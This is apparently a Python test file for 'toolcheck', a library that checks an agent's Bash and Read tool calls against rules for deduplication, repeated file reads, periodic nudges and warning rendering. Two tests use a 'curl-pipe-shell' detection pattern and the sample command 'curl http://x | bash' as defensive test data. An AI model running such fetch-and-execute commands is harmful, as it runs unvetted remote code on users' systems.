"""evaluate_call: dedup gating, cross-call firing, observation recording; render."""

from __future__ import annotations

from hypothesis import given
from hypothesis import strategies as st

from strategies import make_rule
from toolcheck.cli import evaluate_call, render
from toolcheck.schema import CrossCallPredicate, RegexPredicate, Rule
from toolcheck.state import SessionState


def _names(rules: list[Rule]) -> set[str]:
    return {r.name for r in rules}


def test_warning_deduped_to_once_per_session():
    rule = make_rule(
        RegexPredicate(field="command", pattern=r"\bcurl\b[^|]*\|\s*bash\b"),
        name="curl-pipe-shell",
    )
    inp = {"command": "curl http://x | bash"}
    fired1, state1 = evaluate_call("Bash", inp, SessionState(), True, "t1", [rule])
    assert "curl-pipe-shell" in _names(fired1)

    fired2, _ = evaluate_call("Bash", inp, state1, True, "t2", [rule])
    assert "curl-pipe-shell" not in _names(fired2)


def test_stateless_fires_every_time_when_dedup_false():
    rule = make_rule(
        RegexPredicate(field="command", pattern=r"\bcurl\b[^|]*\|\s*bash\b"),
        name="curl-pipe-shell",
        dedup=False,
    )
    inp = {"command": "curl http://x | bash"}
    fired1, state1 = evaluate_call("Bash", inp, SessionState(), True, "t1", [rule])
    fired2, _ = evaluate_call("Bash", inp, state1, True, "t2", [rule])
    assert "curl-pipe-shell" in _names(fired1)
    assert "curl-pipe-shell" in _names(fired2)


def _read_cross_call_rule(name: str = "read-already-read") -> Rule:
    return make_rule(
        CrossCallPredicate(kind="duplicate_field_within_session", field="file_path"),
        tool="Read",
        name=name,
    )


def test_cross_call_fires_per_occurrence_and_is_dedup_exempt():
    rule = _read_cross_call_rule()
    inp = {"file_path": "/a/b.py"}
    fired1, s1 = evaluate_call("Read", inp, SessionState(), True, "t1", [rule])
    assert "read-already-read" not in _names(fired1)  # first sighting

    fired2, s2 = evaluate_call("Read", inp, s1, True, "t2", [rule])
    assert "read-already-read" in _names(fired2)

    fired3, _ = evaluate_call("Read", inp, s2, True, "t3", [rule])
    assert "read-already-read" in _names(fired3)  # still fires — not deduped


def test_cross_call_records_observation_even_without_fire():
    rule = _read_cross_call_rule()
    inp = {"file_path": "/a/b.py"}
    _, s1 = evaluate_call("Read", inp, SessionState(), True, "t1", [rule])
    assert s1.history("Read", "file_path") == ("/a/b.py",)


def test_two_rules_on_same_field_record_one_observation():
    rules = [
        _read_cross_call_rule("dup-a"),
        make_rule(
            CrossCallPredicate(kind="adjacent_near_identical", field="file_path"),
            tool="Read",
            name="dup-b",
        ),
    ]
    _, s1 = evaluate_call(
        "Read", {"file_path": "/a/b.py"}, SessionState(), True, "t1", rules
    )
    assert s1.history("Read", "file_path") == ("/a/b.py",)


def test_no_rules_for_unknown_tool():
    fired, state = evaluate_call("Nonesuch", {}, SessionState(), True, "t", [])
    assert fired == []
    assert state == SessionState()


def _every_calls_rule(every_calls: int) -> Rule:
    return make_rule(
        RegexPredicate(field="command", pattern=r"x"),
        name="nudge",
        every_calls=every_calls,
    )


def _drive_calls(rule: Rule, n_calls: int) -> list[int]:
    """Simulate ``n_calls`` matching calls, returning the 1-based calls that fired."""
    state = SessionState()
    fires: list[int] = []
    for call in range(1, n_calls + 1):
        state = state.with_call()
        fired, state = evaluate_call(
            "Bash",
            {"command": "x"},
            state,
            True,
            "t",
            [rule],
            call_index=call,
        )
        if fired:
            fires.append(call)
    return fires


def test_every_calls_fires_then_waits_the_interval():
    assert _drive_calls(_every_calls_rule(10), 22) == [1, 11, 21]


def test_every_calls_of_one_fires_every_call():
    assert _drive_calls(_every_calls_rule(1), 4) == [1, 2, 3, 4]


def test_every_calls_ignores_dedup():
    rule = make_rule(
        RegexPredicate(field="command", pattern=r"x"),
        name="nudge",
        dedup=True,
        every_calls=5,
    )
    assert _drive_calls(rule, 11) == [1, 6, 11]


def test_every_calls_fires_when_no_call_index_is_known():
    rule = _every_calls_rule(10)
    inp = {"command": "x"}
    fired, _ = evaluate_call("Bash", inp, SessionState(), True, "t", [rule])
    assert "nudge" in _names(fired)


def _render_rule() -> Rule:
    return make_rule(RegexPredicate(field="command", pattern=r"\|"), name="r")


def test_render_two_line_with_sample():
    assert render(_render_rule(), {"command": "x | y"}) == "[r] m\n> x | y"


def test_render_one_line_without_sample():
    assert render(_render_rule(), {}) == "[r] m"


def test_render_derived_sample_field():
    rule = make_rule(
        RegexPredicate(field="command", pattern=r"\|"),
        name="r",
        sample_field="@last_pipe_command",
    )
    assert render(rule, {"command": "rg foo | head"}) == "[r] m\n> head"


@given(
    st.integers(min_value=1, max_value=12),
    st.integers(min_value=1, max_value=60),
)
def test_every_calls_spacing(interval: int, n_calls: int):
    assert _drive_calls(_every_calls_rule(interval), n_calls) == list(
        range(1, n_calls + 1, interval)
    )
